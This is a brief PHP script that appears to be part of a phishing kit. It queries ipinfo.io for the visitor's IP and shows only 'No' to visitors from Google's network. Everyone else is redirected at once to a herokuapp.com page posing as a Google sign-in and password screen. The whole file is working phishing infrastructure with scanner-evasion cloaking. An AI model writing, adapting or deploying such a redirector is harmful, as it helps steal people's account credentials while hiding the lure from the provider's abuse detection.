<?php
@ $details = json_decode(file_get_contents("http://ipinfo.io/{$_SERVER['HTTP_X_FORWARDED_FOR']}/json"));
@ $hostname=gethostbyaddr($_SERVER['HTTP_X_FORWARDED_FOR']);
@ $fileHandle = fopen($outputWebBug, "a");
$QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
if (strpos($details->org, 'Google') !== false) {
	echo "No";
} else {
	echo '<meta http-equiv="refresh" content="0; url=https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?06">';
}
exit;
?>
